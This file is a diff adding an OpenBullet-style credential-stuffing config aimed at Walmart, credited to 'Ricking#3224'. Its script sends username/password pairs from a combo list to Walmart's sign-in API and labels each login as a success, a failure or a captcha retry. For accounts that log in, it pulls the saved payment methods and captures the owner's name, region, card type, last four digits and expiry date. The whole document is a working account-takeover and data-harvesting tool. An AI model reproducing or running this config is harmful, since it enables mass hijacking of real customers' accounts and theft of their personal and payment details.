@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "Walmart",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-22T20:32:06.0376344+01:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.walmart.com/account/electrode/api/signin?tid=0&returnUrl=%2F" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"rememberme\":true,\"showRememberme\":\"true\",\"captcha\":{\"sensorData\":\"\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "origin: https://www.walmart.com" 
+  HEADER "referer: https://www.walmart.com/account/login?tid=0&returnUrl=%2F" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\":\"user_auth_fail" 
+    KEY "Your password and email do not match. Please try again or Reset Your Password" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"OK" 
+  KEYCHAIN Retry OR 
+    KEY "/captcha/captcha" 
+
+PARSE "<SOURCE>" LR "firstName\":\"" "\"" -> VAR "firstName" 
+
+PARSE "<SOURCE>" LR "lastName\":\"" "\"" -> VAR "lastName" 
+
+REQUEST GET "https://www.walmart.com/account/electrode/account/api/customer/:CID/payment-method" 
+  
+  HEADER "referer: https://www.walmart.com/account/creditcards" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "< no pay" 
+
+PARSE "<SOURCE>" JSON "clientCardType" -> VAR "clientCardType" 
+
+PARSE "<SOURCE>" JSON "lastFour" -> VAR "lastFour" 
+
+PARSE "<SOURCE>" JSON "cardExpiryDate" -> VAR "cardExpiryDate" 
+
+PARSE "<SOURCE>" JSON "requiresCvvVerification" -> VAR "requiresCvvVerification" 
+
+PARSE "<SOURCE>" JSON "state" -> VAR "state" 
+
+FUNCTION Constant " [ F/LName : <firstName> <lastName> - Region : <state> - ccType : <clientCardType> - lastFour : <lastFour> - expDate : <cardExpiryDate> - requiresCvv : <requiresCvvVerification> ] " -> CAP "Full-Info" 
+  
